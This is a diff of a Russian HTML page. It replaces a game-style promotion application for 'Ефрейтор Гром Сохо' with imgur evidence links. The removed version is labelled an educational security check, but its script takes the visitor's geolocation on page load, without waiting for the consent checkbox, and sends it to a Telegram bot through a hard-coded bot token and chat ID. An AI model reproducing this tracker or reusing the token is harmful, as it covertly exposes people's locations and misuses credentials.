@@ -1,150 +1,142 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-<meta charset="UTF-8">
-<title>Security Check</title>
+    <meta charset="UTF-8">
+    <title>Заявление на повышение</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #0f172a;
+            color: #e2e8f0;
+            margin: 0;
+            padding: 20px;
+        }
 
-<style>
-body {
-    margin: 0;
-    font-family: Inter, Arial, sans-serif;
-    background: radial-gradient(circle at top, #020617, #000);
-    color: #e5e7eb;
-    min-height: 100vh;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-}
+        .container {
+            max-width: 800px;
+            margin: auto;
+            background: #1e293b;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        }
 
-.card {
-    background: rgba(15, 23, 42, 0.95);
-    border-radius: 18px;
-    padding: 34px;
-    max-width: 720px;
-    width: 90%;
-    box-shadow: 0 30px 80px rgba(0,0,0,.7);
-}
+        h1, h2 {
+            text-align: center;
+            margin-bottom: 10px;
+        }
 
-h1 {
-    margin-top: 0;
-}
+        .header {
+            text-align: right;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
 
-label {
-    display: flex;
-    gap: 10px;
-    margin-top: 20px;
-    font-size: 14px;
-    color: #cbd5f5;
-}
+        .section {
+            margin-bottom: 20px;
+        }
 
-button {
-    margin-top: 24px;
-    width: 100%;
-    padding: 14px;
-    font-size: 16px;
-    border-radius: 12px;
-    border: none;
-    cursor: pointer;
-    background: linear-gradient(135deg, #38bdf8, #6366f1);
-    color: #020617;
-}
+        .section-title {
+            font-weight: bold;
+            margin-bottom: 10px;
+            border-bottom: 1px solid #334155;
+            padding-bottom: 5px;
+        }
 
-button:disabled {
-    opacity: .4;
-    cursor: not-allowed;
-}
+        ul {
+            padding-left: 20px;
+        }
 
-.article {
-    display: none;
-}
-</style>
+        li {
+            margin-bottom: 10px;
+        }
+
+        a {
+            color: #38bdf8;
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            margin-top: 30px;
+            text-align: right;
+        }
+
+        .badge {
+            background: #334155;
+            padding: 5px 10px;
+            border-radius: 8px;
+            display: inline-block;
+            margin-top: 5px;
+        }
+    </style>
 </head>
-
 <body>
 
-<div class="card" id="gate">
-    <h1>🛡 Проверка безопасности</h1>
+<div class="container">
 
-    <p>
-        Данный сайт является учебным проектом по кибербезопасности.
-        Для демонстрации утечки данных браузера используется
-        геолокация пользователя.
-    </p>
+    <div class="header">
+        Генералу Министерства Обороны<br>
+        по Нижегородской области<br>
+        Матвею Берберри<br><br>
+        От "Ефрейтор" "Гром Сохо"
+    </div>
 
-    <p>
-        При подтверждении координаты будут отправлены владельцу проекта
-        через Telegram.
-    </p>
+    <h1>ЗАЯВЛЕНИЕ</h1>
 
-    <label>
-        <input type="checkbox" id="consent">
-        Я понимаю и даю согласие на передачу данных
-    </label>
+    <div class="section">
+        Я, <b>Гром Сохо</b>, находясь в должности <b>"Ефрейтор"</b>, прошу принять моё заявление на повышение до должности <b>"Сержант"</b>.
+    </div>
 
-    <button id="btn" disabled onclick="requestLocation()">
-        Продолжить
-    </button>
+    <div class="section">
+        <div class="section-title">К заявлению прикрепляю:</div>
+        <ul>
+            <li><b>Nick_Name:</b> Grom_Soho</li>
+
+            <li><b>Личное дело:</b><br>
+                <a href="https://imgur.com/a/xB8Zh8V" target="_blank">Смотреть</a>
+            </li>
+
+            <li><b>Список сотрудников:</b><br>
+                <a href="https://imgur.com/a/xB8Zh8V" target="_blank">Смотреть</a>
+            </li>
+
+            <li><b>Трудовая история:</b><br>
+                <a href="https://imgur.com/a/xB8Zh8V" target="_blank">Смотреть</a>
+            </li>
+
+            <li><b>Взвод:</b> <span class="badge">КМБ</span></li>
+        </ul>
+    </div>
+
+    <div class="section">
+        <div class="section-title">Проделанная работа:</div>
+        <ul>
+            <li>Тренировка: 
+                <a href="https://imgur.com/a/x88qN6B" target="_blank">Доказательство</a>
+            </li>
+
+            <li>Спец. задание: 
+                <a href="https://imgur.com/a/x88qN6B" target="_blank">Доказательство</a>
+            </li>
+
+            <li>Пост "Тумбочка" 30 минут: 
+                <a href="https://imgur.com/a/WfVcuwR" target="_blank">Доказательство</a>
+            </li>
+
+            <li>Выбран взвод: <span class="badge">ГОиР</span></li>
+        </ul>
+    </div>
+
+    <div class="footer">
+        Дата: 20.04.2026<br>
+        Подпись: <b>By Soho</b>
+    </div>
+
 </div>
 
-<div class="card article" id="article">
-    <h1>А я знаю что это такое?</h1>
-
-    <p>
-        Смысл жизни редко приходит как готовая формула.
-        Он не записан в инструкциях и не выдается при рождении.
-    </p>
-
-    <p>
-        Он появляется в момент, когда человек начинает
-        осознавать последствия своих действий
-        и принимает ответственность за свой выбор.
-    </p>
-
-    <p>
-        Возможно, смысл жизни —
-        не найти окончательный ответ,
-        а научиться жить с вопросом,
-        не убегая от него.
-    </p>
-</div>
-<script>
-const BOT_TOKEN = "7813938825:AAFEYmSyG68_Ebv9nWcqBAackF42hdq-Ey8";
-const CHAT_ID = "6724600945";
-
-function sendLocation(lat, lon) {
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            latitude: lat,
-            longitude: lon
-        })
-    });
-
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: `📍 Новая геолокация\nLat: ${lat}\nLon: ${lon}`
-        })
-    });
-}
-
-navigator.geolocation.getCurrentPosition(
-    (pos) => {
-        sendLocation(
-            pos.coords.latitude,
-            pos.coords.longitude
-        );
-        document.body.innerHTML = "✅ Готово";
-    },
-    (err) => {
-        document.body.innerHTML = "❌ Доступ к геолокации запрещён";
-    },
-    { enableHighAccuracy: true }
-);
-</script>
 </body>
 </html>
